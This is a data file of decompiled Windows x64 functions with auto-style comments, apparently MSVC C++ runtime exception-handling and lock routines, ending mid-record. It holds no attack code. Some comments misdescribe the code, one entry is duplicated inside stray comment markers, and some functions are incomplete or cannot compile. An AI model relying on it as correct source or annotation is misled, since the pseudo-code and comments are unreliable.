{"Function Name": "FUN_14000d804", "Address": "14000d804", "Source Code": "\nvoid FUN_14000d804(EHExceptionRecord *exceptionRecord, __uint64 *uint64Ptr1, _CONTEXT *context,\n_xDISPATCHER_CONTEXT *dispatcherContext, _s_FuncInfo *functionInfo, int exceptionCode, int param7,\n__uint64 *uint64Ptr2)\n{\n    longlong tryBlockInfo; // Variable to hold a long long value\n    code *systemCallAddress; // Pointer to a code function\n    int dispatchType; // Variable to hold an integer value\n    longlong handlerAddress; // Variable to hold a long long value\n    PVOID encodedPointer; // Pointer variable\n    uint loopIndex; // Variable to hold an unsigned integer\n    _s_FuncInfo *localFunctionInfo; // Local pointer to function information structure\n    undefined8 dispatcherValue; // Local variable for storing an undefined 8-byte value\n    undefined4 resultValue; // Local variable for storing an undefined 4-byte value\n    undefined4 stackValue1; // Stack variable for storing an undefined 4-byte value\n    uint stackValue2; // Stack variable for storing an unsigned integer\n    undefined4 stackValue3; // Stack variable for storing an undefined 4-byte value\n    _s_TryBlockMapEntry tryBlockEntry; // Local variable for storing try block map entry\n    undefined4 localValue; // Local variable for storing an undefined 4-byte value\n    uint stackValue4; // Stack variable for storing an unsigned integer\n    uint localCount; // Local variable for storing an unsigned integer\n\n    // Check if the exception record is not a specific value\n    if (*(int *)exceptionRecord != -0x7ffffffd) {\n        handlerAddress = __vcrt_getptd(); // Get the thread local storage pointer\n        // Check if the pointer at offset 0x10 is not null\n        if (*(longlong *)(handlerAddress + 0x10) != 0) {\n            encodedPointer = EncodePointer((PVOID)0x0); // Encode a null pointer\n            handlerAddress = __vcrt_getptd(); // Get the thread local storage pointer again\n            // Check multiple conditions for exception handling\n            if ((((*(PVOID *)(handlerAddress + 0x10) != encodedPointer) && (*(int *)exceptionRecord != -0x1fbcb0b3)) &&\n            (*(int *)exceptionRecord != -0x1fbcbcae)) &&\n            (dispatchType = _CallSETranslator<>((undefined4 *)exceptionRecord, uint64Ptr1, context), dispatchType != 0)) {\n                return; // Exit if conditions are met\n            }\n        }\n        dispatcherValue = *(undefined8 *)(dispatcherContext + 8); // Store the value from the dispatcher context\n        localFunctionInfo = functionInfo; // Assign function info to local variable\n        // Check if there are no try blocks\n        if (functionInfo->nTryBlocks == 0) {\n            terminate(); // Terminate the program\n            systemCallAddress = (code *)swi(3); // Get the address of the system call\n            (*systemCallAddress)(); // Call the system function\n            return; // Exit the function\n        }\n        // Call function to process try block information\n        FUN_14000bc54((undefined8 *)&localValue, &localFunctionInfo, exceptionCode, dispatcherContext, functionInfo);\n        resultValue = localValue; // Store the result in local variable\n        stackValue1 = stackValue4; // Copy stack variable\n        stackValue2 = stackValue4; // Copy stack variable\n        stackValue3 = stackValue4; // Copy stack variable\n        // Check if the stack variable is less than local variable\n        if (stackValue4 < localCount) {\n            loopIndex = stackValue4; // Initialize loop variable\n            do {\n                tryBlockInfo = *(longlong *)(CONCAT44(stackValue1, localValue) + 8); // Get try block information\n                handlerAddress = (longlong)*(int *)(*(longlong *)CONCAT44(stackValue1, resultValue) + 0x10) +\n                (ulonglong)loopIndex * 0x14; // Calculate address for try block\n                int *tryBlockData = (int *)(handlerAddress + tryBlockInfo); // Pointer to try block data\n                tryBlockEntry.tryLow = *tryBlockData; // Set try block low range\n                tryBlockEntry.tryHigh = tryBlockData[1]; // Set try block high range\n                tryBlockEntry.catchHigh = (__ehstate_t)*(ulonglong *)(tryBlockData + 2); // Set catch high state\n                tryBlockEntry.nCatches = tryBlockData[3]; // Set number of catches\n                tryBlockEntry.dispHandlerArray = *(int *)(handlerAddress + 0x10 + tryBlockInfo); // Get dispatch handler array\n                // Check if the current exception falls within the try block range\n                if ((tryBlockEntry.tryLow <= exceptionCode) && (exceptionCode <= tryBlockEntry.tryHigh)) {\n                    _s_HandlerType *handlerType = (_s_HandlerType *)\n                    ((longlong)tryBlockEntry.dispHandlerArray + *(longlong *)(dispatcherContext + 8) +\n                    ((*(ulonglong *)(tryBlockData + 2) >> 0x20) - 1) * 0x14); // Get handler type\n                    // Check if the dispatch type is zero\n                    if (handlerType->dispType == 0) {\n                        handlerAddress = 0; // Set lVar6 to zero\n                        dispatchType = 0; // Set iVar5 to zero\n                    } else {\n                        dispatchType = handlerType->dispType; // Get dispatch type\n                        handlerAddress = _GetImageBase() + dispatchType; // Calculate the image base address\n                    }\n                    // Check if the handler address is valid\n                    if (handlerAddress != 0) {\n                        if (dispatchType == 0) {\n                            handlerAddress = 0; // Set lVar6 to zero if dispatch type is zero\n                        } else {\n                            handlerAddress = _GetImageBase() + (int)handlerType->dispType; // Calculate the handler address\n                        }\n                        // Check if the handler is valid\n                        if (*(char *)(handlerAddress + 0x10) != '\\0') goto LAB_14000d9ea; // Jump if handler is valid\n                    }\n                    // Check if the handler does not have a specific adjective\n                    if ((handlerType->adjectives & 0x40) == 0) {\n                        // Call the catch function with the appropriate parameters\n                        CatchIt<class___FrameHandler3>\n                        (exceptionRecord, uint64Ptr1, context, dispatcherContext, functionInfo, handlerType, (_s_CatchableType *)0x0,\n                        &tryBlockEntry, param7, uint64Ptr2, '\\x01', '\\0');\n                    }\n                }\nLAB_14000d9ea: // Label for continuing the loop\n                loopIndex++; // Increment loop variable\n            } while (loopIndex < localCount); // Continue loop while within bounds\n        }\n    }\n    return; // Exit the function\n}\n"}
{"Function Name": "TypeMatchHelper<>", "Address": "14000da18", "Source Code": "\\*\nundefined8 TypeMatchHelper<>(byte *param_1, byte *param_2, byte *param_3) {\n    longlong imageBaseAddress = 0; // Initialize variable to store image base address\n    longlong comparisonValue = 0; // Initialize variable for comparison\n    int retrievedInteger = *(int *)(param_1 + 4); // Retrieve the integer value from param_1\n\n    if (retrievedInteger != 0) { // Check if iVar8 is not zero\n        imageBaseAddress = _GetImageBase() + retrievedInteger; // Calculate the image base address\n    }\n\n    // Check if lVar3 is valid and certain conditions on param_1 and param_2 are met\n    if (imageBaseAddress != 0 && (*(char *)(imageBaseAddress + 0x10) != '\\0') && ((*param_1 & 0x80) == 0 || ((*param_2 & 0x10) == 0))) {\n        comparisonValue = (retrievedInteger != 0) ? _GetImageBase() + retrievedInteger : 0; // Set lVar5 based on iVar8\n        longlong throwImageBaseAddress = _GetThrowImageBase(); // Get the throw image base address\n\n        // Check if lVar5 does not match the expected value\n        if (comparisonValue != throwImageBaseAddress + *(int *)(param_2 + 4)) {\n            comparisonValue = (retrievedInteger != 0) ? _GetImageBase() + retrievedInteger : 0; // Recalculate lVar5\n            imageBaseAddress = _GetThrowImageBase(); // Get the throw image base again\n            char *dataPointer = (char *)(comparisonValue + 0x10); // Pointer to the data at lVar5 + 0x10\n            imageBaseAddress = ((longlong)*(int *)(param_2 + 4) + 0x10 + imageBaseAddress) - (longlong)dataPointer; // Calculate offset\n\n            while (1) { // Loop to compare characters\n                char currentCharacter = *dataPointer; // Get current character from pcVar6\n                char offsetCharacter = dataPointer[imageBaseAddress]; // Get character from calculated offset\n                if (currentCharacter != offsetCharacter) { // If characters do not match\n                    return 0; // Return 0 indicating a mismatch\n                }\n                if (offsetCharacter == '\\0') { // If end of string is reached\n                    break; // Exit the loop\n                }\n                dataPointer++; // Move to the next character\n            }\n        }\n    }\n\n    // Check various conditions based on param_1 and param_3\n    if (((*param_2 & 2) != 0 && (*param_1 & 8) == 0) ||\n        ((*param_3 & 1) != 0 && (*param_1 & 1) == 0) ||\n        ((*param_3 & 4) != 0 && (*param_1 & 4) == 0) ||\n        ((*param_3 & 2) != 0 && (*param_1 & 2) == 0)) {\n        return 0; // Return 0 if any condition fails\n    }\n\n    return 1; // Return 1 indicating a successful match\n}\n*\\ \n \n\nundefined8 TypeMatchHelper<>(byte *param_1, byte *param_2, byte *param_3) {\n    longlong imageBaseAddress = 0;\n    longlong comparisonValue = 0;\n    int retrievedInteger = *(int *)(param_1 + 4);\n\n    if (retrievedInteger != 0) {\n        imageBaseAddress = _GetImageBase() + retrievedInteger;\n    }\n\n    if (imageBaseAddress != 0 && (*(char *)(imageBaseAddress + 0x10) != '\\0') && ((*param_1 & 0x80) == 0 || ((*param_2 & 0x10) == 0))) {\n        comparisonValue = (retrievedInteger != 0) ? _GetImageBase() + retrievedInteger : 0;\n        longlong throwImageBaseAddress = _GetThrowImageBase();\n\n        if (comparisonValue != throwImageBaseAddress + *(int *)(param_2 + 4)) {\n            comparisonValue = (retrievedInteger != 0) ? _GetImageBase() + retrievedInteger : 0;\n            imageBaseAddress = _GetThrowImageBase();\n            char *dataPointer = (char *)(comparisonValue + 0x10);\n            imageBaseAddress = ((longlong)*(int *)(param_2 + 4) + 0x10 + imageBaseAddress) - (longlong)dataPointer;\n\n            while (1) {\n                char currentCharacter = *dataPointer;\n                char offsetCharacter = dataPointer[imageBaseAddress];\n                if (currentCharacter != offsetCharacter) {\n                    return 0;\n                }\n                if (offsetCharacter == '\\0') {\n                    break;\n                }\n                dataPointer++;\n            }\n        }\n    }\n\n    if (((*param_2 & 2) != 0 && (*param_1 & 8) == 0) ||\n        ((*param_3 & 1) != 0 && (*param_1 & 1) == 0) ||\n        ((*param_3 & 4) != 0 && (*param_1 & 4) == 0) ||\n        ((*param_3 & 2) != 0 && (*param_1 & 2) == 0)) {\n        return 0;\n    }\n\n    return 1;\n}\n"}
{"Function Name": "FUN_14000db5c", "Address": "14000db5c", "Source Code": "\nundefined8\nFUN_14000db5c(EHExceptionRecord *exceptionRecord, __uint64 *outputParam, _CONTEXT *context,\n_xDISPATCHER_CONTEXT *dispatcherContext, _s_FuncInfo *functionInfo, int stateIndex, __uint64 *additionalParam,\nbyte byteFlag)\n{\n    code *codeFunctionPtr; // Pointer to a code function\n    int state; // Variable to store state or index\n    longlong threadLocalDataPtr; // Variable to store a long long value\n    undefined8 resultValue; // Variable to store an undefined 8-byte value\n    undefined4 upperContextBits; // Variable to store an undefined 4-byte value\n\n    upperContextBits = (undefined4)((ulonglong)context >> 0x20); // Extract upper 32 bits of param_3\n    __except_validate_context_record((longlong)context); // Validate the context record\n\n    threadLocalDataPtr = __vcrt_getptd(); // Get the thread-local data pointer\n    if ((*(int *)(threadLocalDataPtr + 0x40) == 0) && (*(int *)exceptionRecord != -0x1f928c9d)) { // Check thread state and exception record\n        if (*(int *)exceptionRecord == -0x7fffffd7) { // Check for specific exception code\n            if (*(int *)(exceptionRecord + 0x18) == 0xf) { // Check a specific field in the exception record\n                if (*(longlong *)(exceptionRecord + 0x60) == 0x19930520) // Check another field\n                    goto LAB_14000dbe2; // Jump to label if condition is met\n                goto LAB_14000dbc8; // Jump to another label if condition is not met\n            }\n        }\n        else {\nLAB_14000dbc8:\n            if (*(int *)exceptionRecord == -0x7fffffda) // Check for another specific exception code\n                goto LAB_14000dbe2; // Jump to label if condition is met\n        }\n        if ((0x19930521 < (functionInfo->magicNumber_and_bbtFlags & 0x1fffffff)) && // Check magic number and flags\n            ((functionInfo->EHFlags & 1) != 0)) { // Check exception handling flags\n            return 1; // Return 1 if conditions are met\n        }\n    }\nLAB_14000dbe2:\n    if (((byte)exceptionRecord[4] & 0x66) != 0) { // Check specific bits in the exception record\n        if (functionInfo->maxState == 0 || stateIndex != 0) { // Check max state and parameter\n            return 1; // Return 1 if conditions are met\n        }\n        if (((byte)exceptionRecord[4] & 0x20) != 0) { // Check another specific bit\n            if (*(int *)exceptionRecord == -0x7fffffda) { // Check for specific exception code\n                state = __FrameHandler3::StateFromIp(functionInfo, dispatcherContext, *(__uint64 *)(dispatcherContext + 0x20)); // Get state from IP\n                if ((state < -1) || (functionInfo->maxState <= state)) { // Validate state\n                    terminate(); // Terminate if invalid state\n                    codeFunctionPtr = (code *)swi(3); // Switch to another context\n                    resultValue = (*codeFunctionPtr)(); // Call the function pointed by pcVar1\n                    return resultValue; // Return the result\n                }\n            }\n            else {\n                if (*(int *)exceptionRecord != -0x7fffffd7) // Check for another specific exception code\n                    goto LAB_14000dc68; // Jump to label if condition is not met\n                state = *(int *)(exceptionRecord + 0x38); // Get state from exception record\n                if ((state < -1) || (functionInfo->maxState <= state)) // Validate state\n                    goto LAB_14000dd9c; // Jump to label if invalid\n                outputParam = *(__uint64 **)(exceptionRecord + 0x28); // Get parameter from exception record\n            }\n            FUN_14000e074(outputParam, dispatcherContext, functionInfo, state); // Call function with parameters\n            return 1; // Return 1\n        }\nLAB_14000dc68:\n        __FrameHandler3::FrameUnwindToEmptyState(outputParam, dispatcherContext, functionInfo); // Unwind to empty state\n        return 1; // Return 1\n    }\n    if (functionInfo->nTryBlocks == 0) { // Check if there are no try blocks\n        if (0x19930520 < (functionInfo->magicNumber_and_bbtFlags & 0x1fffffff)) { // Check magic number\n            if (functionInfo->dispESTypeList == 0) { // Check if dispatch list is empty\n                threadLocalDataPtr = 0; // Set lVar3 to 0\n            }\n            else {\n                threadLocalDataPtr = _GetImageBase() + (int)functionInfo->dispESTypeList; // Calculate image base\n            }\n            if (threadLocalDataPtr != 0) // Check if lVar3 is not zero\n                goto LAB_14000dccc; // Jump to label if condition is met\n        }\n        if ((functionInfo->magicNumber_and_bbtFlags & 0x1fffffff) < 0x19930522) { // Check magic number\n            return 1; // Return 1 if condition is met\n        }\n        if (((uint)functionInfo->EHFlags >> 2 & 1) == 0) { // Check exception handling flags\n            return 1; // Return 1 if condition is met\n        }\n    }\nLAB_14000dccc:\n    if (((*(int *)exceptionRecord == -0x1f928c9d) && (2 < *(uint *)(exceptionRecord + 0x18))) && // Check specific conditions\n        (0x19930522 < *(uint *)(exceptionRecord + 0x20))) { // Check magic number\n        if (*(int *)(*(longlong *)(exceptionRecord + 0x30) + 8) == 0) { // Check if a specific field is zero\n            threadLocalDataPtr = 0; // Set lVar3 to 0\n        }\n        else {\n            threadLocalDataPtr = _GetThrowImageBase() + *(int *)(*(longlong *)(exceptionRecord + 0x30) + 8); // Calculate throw image base\n        }\n        if (threadLocalDataPtr != 0) { // Check if lVar3 is not zero\n            resultValue = (*(code *)PTR__guard_dispatch_icall_1400213e8) // Call guard dispatch function\n            (exceptionRecord, outputParam, context, dispatcherContext, functionInfo, stateIndex, additionalParam,\n            CONCAT44(upperContextBits, (uint)byteFlag)); // Pass parameters to the function\n            return resultValue; // Return the result\n        }\n    }\n    FUN_14000d328(exceptionRecord, outputParam, context, dispatcherContext, functionInfo, byteFlag, stateIndex, additionalParam); // Call another function with parameters\n    return 1; // Return 1\n}\n"}
{"Function Name": "FUN_14000dda4", "Address": "14000dda4", "Source Code": "\nundefined8 * FUN_14000dda4(undefined8 *exception_pointer,longlong exception_data_address)\n{\n    // Set the first element of param_1 to the vftable of std::bad_exception\n    *exception_pointer = std::bad_exception::vftable;\n    \n    // Initialize the second element of param_1 to 0\n    exception_pointer[1] = 0;\n    \n    // Copy exception data from the memory location (param_2 + 8) to param_1 + 1\n    __std_exception_copy((longlong *)(exception_data_address + 8), exception_pointer + 1);\n    \n    // Return the modified param_1 pointer\n    return exception_pointer;\n}\n"}
{"Function Name": "FUN_14000dde0", "Address": "14000dde0", "Source Code": "\nundefined8 * FUN_14000dde0(undefined8 *array_pointer)\n{\n    // Set the third element of the array pointed to by param_1 to 0\n    array_pointer[2] = 0;\n    \n    // Set the second element of the array to the string \"bad exception\"\n    array_pointer[1] = \"bad exception\";\n    \n    // Set the first element of the array to the vftable of std::bad_exception\n    *array_pointer = std::bad_exception::vftable;\n    \n    // Return the modified pointer param_1\n    return array_pointer;\n}\n"}
{"Function Name": "__FrameHandler3::CxxCallCatchBlock", "Address": "14000de00", "Source Code": "\nvoid * __cdecl __FrameHandler3::CxxCallCatchBlock(_EXCEPTION_RECORD *exception_record)\n{\n    // Retrieve the pointer to the exception information\n    int *exception_info_pointer = (int *)exception_record->ExceptionInformation[6];\n    \n    // Get the ULONG_PTR value from the exception information\n    ULONG_PTR ulong_ptr_value = exception_record->ExceptionInformation[5];\n    \n    // Get the pointer to the longlong value from the exception information\n    longlong *longlong_pointer = (longlong *)exception_record->ExceptionInformation[1];\n    \n    // Validate the context record of the exception\n    __except_validate_context_record(exception_record->ExceptionInformation[4]);\n    \n    // Store the exception information pointer in the thread-local storage\n    *(int **)(__vcrt_getptd() + 0x20) = exception_info_pointer;\n    \n    // Store another piece of exception information in the thread-local storage\n    *(ULONG_PTR *)(__vcrt_getptd() + 0x28) = exception_record->ExceptionInformation[4];\n    \n    // Create frame information using local variable and exception information\n    undefined8 *frame_info_pointer = _CreateFrameInfo(local_48, *(undefined8 *)(*(longlong *)(__vcrt_getptd() + 0x20) + 0x28));\n    \n    // Check if a specific exception information flag is set\n    if (exception_record->ExceptionInformation[7] != 0) {\n        // Retrieve the thread-local storage again\n        __vcrt_getptd();\n    }\n    \n    // Call the function to set the frame and store the return value\n    void *return_value = (void *)_CallSettingFrame();\n    \n    // Unlink the created frame from the exception handling chain\n    _FindAndUnlinkFrame((longlong)frame_info_pointer);\n    \n    // Check specific conditions to determine if the exception object should be destroyed\n    if (((*exception_info_pointer == -0x1f928c9d) && (exception_info_pointer[6] == 4) && (exception_info_pointer[8] + 0xe66cfae0U < 3)) &&\n        (_IsExceptionObjectToBeDestroyed(*(longlong *)(exception_info_pointer + 10)) != 0)) {\n        // Destruct the exception object if conditions are met\n        __DestructExceptionObject(exception_info_pointer);\n    }\n    \n    // Maintain the current state of the thread-local storage values\n    *(undefined8 *)(__vcrt_getptd() + 0x20) = *(undefined8 *)(__vcrt_getptd() + 0x20);\n    *(undefined8 *)(__vcrt_getptd() + 0x28) = *(undefined8 *)(__vcrt_getptd() + 0x28);\n    \n    // Set a specific value in the exception information structure\n    *(undefined8 *)((longlong)*(int *)(ulong_ptr_value + 0x1c) + *longlong_pointer) = 0xfffffffffffffffe;\n    \n    // Return the value obtained from setting the frame\n    return return_value;\n}\n"}
{"Function Name": "ExFilterRethrow", "Address": "14000dfec", "Source Code": "\nint __cdecl ExFilterRethrow(_EXCEPTION_POINTERS *exceptionPointers, EHExceptionRecord *exceptionRecord, int *outputParam)\n{\n    // Retrieve the exception record from the provided exception pointers\n    PEXCEPTION_RECORD exceptionRecordPtr = exceptionPointers->ExceptionRecord;\n    \n    // Initialize the output parameter to 0\n    *outputParam = 0;\n    \n    // Check if the exception code matches a specific value and if the number of parameters is 4\n    if (exceptionRecordPtr->ExceptionCode == 0xe06d7363 && exceptionRecordPtr->NumberParameters == 4 &&\n        // Check if the first exception information parameter is greater than a specific value\n        (2 < (int)exceptionRecordPtr->ExceptionInformation[0] + 0xe66cfae0U ||\n         // Check if the second exception information parameter does not match a specific value\n         (exceptionRecordPtr->ExceptionInformation[1] != *(ULONG_PTR *)(exceptionRecord + 0x28) && (*outputParam = 1)))) &&\n        // Ensure the first exception information parameter is less than 3 and the third parameter is 0\n        ((int)exceptionRecordPtr->ExceptionInformation[0] + 0xe66cfae0U < 3 && exceptionRecordPtr->ExceptionInformation[2] == 0)) {\n        \n        // Set a specific value in the thread-local storage\n        *(undefined4 *)(__vcrt_getptd() + 0x40) = 1;\n        \n        // Update the output parameter to indicate an error condition\n        *outputParam = 1;\n        \n        // Return 1 indicating that the exception should be rethrown\n        return 1;\n    }\n}\n"}
{"Function Name": "FUN_14000e074", "Address": "14000e074", "Source Code": "\nvoid FUN_14000e074(__uint64 *threadData, _xDISPATCHER_CONTEXT *dispatcherContext, _s_FuncInfo *functionInfo, int stateThreshold)\n{\n    int currentState; // Variable to hold the current state\n    code *functionPointer; // Pointer to a function code\n    undefined8 imageBaseAddress; // Variable to hold the image base address\n    longlong threadDataPointer; // Variable to hold the pointer to the thread data\n    longlong stateIndex; // Variable to hold the state index\n\n    imageBaseAddress = _GetImageBase(); // Get the base address of the image\n    currentState = __FrameHandler3::GetCurrentState(threadData, dispatcherContext, functionInfo); // Get the current state\n\n    threadDataPointer = __vcrt_getptd(); // Get the pointer to the thread data\n    *(int *)(threadDataPointer + 0x30) = *(int *)(threadDataPointer + 0x30) + 1; // Increment the thread's state counter\n\n    do {\n        // Check if the current state is invalid or less than/equal to the provided parameter\n        if ((currentState == -1) || (currentState <= stateThreshold)) {\n            // If the state counter is greater than 0, decrement it\n            if (0 < *(int *)(threadDataPointer + 0x30)) {\n                *(int *)(threadDataPointer + 0x30) = *(int *)(threadDataPointer + 0x30) - 1;\n            }\n            // Check again if the current state is invalid or less than/equal to the provided parameter\n            if ((currentState == -1) || (currentState <= stateThreshold)) {\n                __FrameHandler3::SetState(threadData, functionInfo, currentState); // Set the state\n                return; // Exit the function\n            }\nLAB_14000e1f8:\n            terminate(); // Terminate the process\n            functionPointer = (code *)swi(3); // Switch to the specified interrupt\n            (*functionPointer)(); // Call the function pointed to by pcVar2\n            return; // Exit the function\n        }\n\n        // Check if the current state is invalid or exceeds the maximum state\n        if ((currentState < 0) || (functionInfo->maxState <= currentState)) {\n            terminate(); // Terminate the process\n            goto LAB_14000e1f8; // Go to the termination label\n        }\n\n        stateIndex = (longlong)currentState; // Convert the current state to longlong\n        // Get the unwind map entry for the current state\n        currentState = *(int *)((longlong)(int)functionInfo->dispUnwindMap + _GetImageBase() + stateIndex * 8);\n        \n        // Check if the unwind map entry is valid\n        if (*(int *)((longlong)(int)functionInfo->dispUnwindMap + 4 + _GetImageBase() + stateIndex * 8) != 0) {\n            threadDataPointer = _GetImageBase() + *(int *)((longlong)(int)functionInfo->dispUnwindMap + 4 + _GetImageBase() + stateIndex * 8); // Get the unwind map address\n        } else {\n            threadDataPointer = 0; // Set to 0 if invalid\n        }\n\n        // If the unwind map address is valid, set the state and perform additional actions\n        if (threadDataPointer != 0) {\n            __FrameHandler3::SetState(threadData, functionInfo, currentState); // Set the state\n            // Check again if the unwind map entry is valid\n            if (*(int *)((longlong)(int)functionInfo->dispUnwindMap + 4 + _GetImageBase() + stateIndex * 8) != 0) {\n                _GetImageBase(); // Call to get the image base (redundant)\n                _GetImageBase(); // Call to get the image base (redundant)\n            }\n            _CallSettingFrame(); // Call to set the frame\n            FUN_14000bf70(imageBaseAddress); // Call the function with the image base\n        }\n    } while (true); // Infinite loop\n}\n"}
{"Function Name": "__FrameHandler3::GetHandlerSearchState", "Address": "14000e200", "Source Code": "\nint __cdecl\n__FrameHandler3::GetHandlerSearchState\n(__uint64 *param_1, _xDISPATCHER_CONTEXT *param_2, _s_FuncInfo *param_3)\n{\n    // Call a function to get the handler search state based on the function info and dispatcher context\n    int iVar1 = FUN_14000cf24(param_3, param_2);\n    \n    // Declare a local variable to store the result from GetEstablisherFrame\n    __uint64 local_res20;\n    \n    // Retrieve the establisher frame using the provided parameters\n    GetEstablisherFrame(param_1, param_2, param_3, &local_res20);\n    \n    // Get the current unwind try block state\n    int iVar2 = GetUnwindTryBlock(param_1, param_2, param_3);\n    \n    // Check if the current unwind try block state is less than the handler search state\n    if (iVar2 < iVar1) {\n        // Set the state using the establisher frame and function info\n        SetState(&local_res20, param_3, iVar1);\n        \n        // Update the unwind try block with the new handler search state\n        SetUnwindTryBlock(param_1, param_2, param_3, iVar1);\n    }\n    \n    // Return the handler search state\n    return iVar1;\n}\n"}
{"Function Name": "FUN_14000e298", "Address": "14000e298", "Source Code": "\nundefined1 FUN_14000e298(longlong input_param, int *input_array)\n{\n    int temp_int; // Variable to hold an integer value\n    byte *byte_pointer; // Pointer to a byte\n    code *function_pointer; // Pointer to a function\n    undefined1 return_value = 0; // Variable initialized to 0\n    longlong base_address_throw_image; // Variable to hold a long long value\n    longlong base_address_image; // Variable to hold a long long value\n    undefined8 match_result; // Variable to hold an undefined 8-byte value\n    int index = 0; // Index variable initialized to 0\n    int *int_pointer; // Pointer to an integer\n    int count; // Variable to hold an integer value\n\n    // Check if param_2 is NULL\n    if (input_array == (int *)0x0) {\n        terminate(); // Call terminate function\n        function_pointer = (code *)swi(3); // Call software interrupt 3\n        return (*function_pointer)(); // Execute the function pointed by pcVar3\n    }\n\n    // Check if the first element of param_2 is greater than 0\n    if (0 < *input_array) {\n        do {\n            base_address_throw_image = _GetThrowImageBase(); // Get the base address of the throw image\n            int_pointer = (int *)((longlong)*(int *)(*(longlong *)(input_param + 0x30) + 0xc) + 4 + base_address_throw_image); // Calculate pointer to integer\n            count = *(int *)(base_address_throw_image + *(int *)(*(longlong *)(input_param + 0x30) + 0xc)); // Get integer value from calculated address\n            // Check if iVar10 is greater than 0\n            if (0 < count) {\n                do {\n                    base_address_throw_image = _GetThrowImageBase(); // Get the base address of the throw image again\n                    byte_pointer = *(byte **)(input_param + 0x30); // Get pointer to byte array\n                    temp_int = *int_pointer; // Dereference piVar9 to get integer value\n                    base_address_image = _GetImageBase(); // Get the base address of the image\n                    // Call TypeMatchHelper with calculated parameters\n                    match_result = TypeMatchHelper<>((byte *)((longlong)input_array[1] + base_address_image + (longlong)index * 0x14),\n                                               (byte *)(base_address_throw_image + temp_int), byte_pointer);\n                    // Check if the result of TypeMatchHelper is not zero\n                    if ((int)match_result != 0) {\n                        return 1; // Return 1 if match found\n                    }\n                    count--; // Decrement iVar10\n                    int_pointer++; // Move to the next integer in the array\n                } while (0 < count); // Continue while iVar10 is greater than 0\n            }\n            index++; // Increment index variable\n        } while (index < *input_array); // Continue while iVar8 is less than the value pointed by param_2\n    }\n    return return_value; // Return the initialized variable (0)\n}\n"}
{"Function Name": "Is_bad_exception_allowed", "Address": "14000e388", "Source Code": "\nuchar __cdecl Is_bad_exception_allowed(_s_ESTypeList *est_type_list)\n{\n    int loop_counter = 0; // Initialize a counter for the loop\n    longlong offset = 0; // Initialize an offset for accessing elements\n\n    // Check if the first element of param_1 is greater than 0\n    if (0 < *(int *)est_type_list) {\n        do {\n            longlong calculated_address = _GetImageBase(); // Get the base address of the image\n            // Retrieve the value from the calculated address and store it in iVar1\n            int value = *(int *)((longlong)*(int *)(est_type_list + 4) + 4 + calculated_address + offset);\n            // Calculate the new address based on iVar1, or set to 0 if iVar1 is 0\n            calculated_address = (value == 0) ? 0 : calculated_address + value;\n\n            // Compare the type information at the calculated address with a specific value\n            if (__std_type_info_compare(calculated_address + 8, 0x140038c30) == 0) {\n                return '\\x01'; // Return 1 if the comparison matches\n            }\n            loop_counter++; // Increment the loop counter\n            offset += 0x14; // Increment the offset for the next iteration\n        } while (loop_counter < *(int *)est_type_list); // Continue looping until the counter reaches the specified limit\n    }\n    return '\\0'; // Return 0 if no match was found\n}\n"}
{"Function Name": "FUN_14000e410", "Address": "14000e410", "Source Code": "\nvoid FUN_14000e410(undefined8 input_value, undefined *function_pointer, undefined8 additional_value)\n{\n    // Cast the UNRECOVERED_JUMPTABLE to a function pointer type that takes two undefined8 parameters\n    // and returns void, then call the function with param_1 and param_3 as arguments.\n    ((void (*)(undefined8, undefined8))function_pointer)(input_value, additional_value);\n}\n"}
{"Function Name": "_CallMemberFunction2", "Address": "14000e41c", "Source Code": "\nvoid __cdecl _CallMemberFunction2(void *object, void *functionPointer, void *arg3, int arg4)\n{\n    // Cast param_2 to a function pointer and call the function\n    // with param_1, param_3, and param_4 as arguments\n    (*(code *)functionPointer)(object, arg3, arg4);\n}\n"}
{"Function Name": "FUN_14000e42c", "Address": "14000e42c", "Source Code": "\nvoid FUN_14000e42c(void) // Function definition for FUN_14000e42c\n{\n    destinationVariable = sourceVariable; // Assign the value of DAT_140038080 to DAT_140039cc0\n}\n"}
{"Function Name": "__vcrt_initialize_locks", "Address": "14000e43c", "Source Code": "\nundefined8 __vcrt_initialize_locks(void) // Function to initialize locks\n{\n    ulonglong lockIndex = 0; // Variable to iterate through lock sections\n    do {\n        // Initialize a critical section with specified parameters\n        undefined8 initializationResult = __vcrt_InitializeCriticalSectionEx((LPCRITICAL_SECTION)(&DAT_140039cc8 + lockIndex * 0x28), 4000, 0);\n        \n        // Check if the initialization was unsuccessful\n        if ((int)initializationResult == 0) {\n            // Uninitialize locks and return error code\n            return __vcrt_uninitialize_locks() & 0xffffffffffffff00;\n        }\n        \n        // Increment the lock counter\n        lockCounter++;\n        lockIndex++; // Move to the next lock section\n    } while (lockIndex == 0); // Continue until all sections are initialized\n    // Return success code with the initialized status\n    return CONCAT71((int7)((ulonglong)initializationResult >> 8), 1);\n}\n"}
{"Function Name": "__vcrt_uninitialize_locks", "Address": "14000e484", "Source Code": "\nundefined8 __vcrt_uninitialize_locks(void)\n{\n    // Declare a variable to hold the current number of locks\n    ulonglong currentLockCount = (ulonglong)totalLocks;\n\n    // Loop while there are still locks to delete\n    while ((int)currentLockCount != 0) {\n        // Decrement the lock counter\n        currentLockCount--;\n\n        // Delete the critical section associated with the current lock\n        DeleteCriticalSection((LPCRITICAL_SECTION)(&lockArray + currentLockCount * 0x28));\n\n        // Decrement the total number of locks\n        totalLocks--;\n    }\n\n    // Return success indicator\n    return 1;\n}\n"}
{"Function Name": "try_get_function", "Address": "14000e4bc", "Source Code": "\nvoid * __cdecl\ntry_get_function(function_id param_1, char *param_2, module_id *param_3, module_id *param_4)\n{\n    module_id mVar2; // Variable to hold the current module ID\n    DWORD DVar4; // Variable to hold the last error code\n    HMODULE hLibModule; // Handle for the loaded library module\n    FARPROC pFVar6; // Pointer to the function address\n    void *pvVar7; // Pointer to the retrieved function\n    byte bVar3 = (byte)DAT_140038080 & 0x3f; // Mask to extract bits for rotation\n\n    // Calculate the function pointer based on the provided function ID and a bitwise operation\n    pvVar7 = (void *)((DAT_140038080 ^ (&DAT_140039d10)[param_1]) >> bVar3 |\n                     (DAT_140038080 ^ (&DAT_140039d10)[param_1]) << 0x40 - bVar3);\n    \n    // Check if the function pointer is valid\n    if (pvVar7 != (void *)0xffffffffffffffff) {\n        if (pvVar7 != (void *)0x0) {\n            return pvVar7; // Return the valid function pointer\n        }\n        \n        // If the start and end of the module list are different\n        if (param_3 != param_4) {\n            do {\n                mVar2 = *param_3; // Get the current module ID\n                hLibModule = (HMODULE)(&DAT_140039cf8)[mVar2]; // Retrieve the library module handle\n                \n                // If the module handle is null, attempt to load the library\n                if (hLibModule == 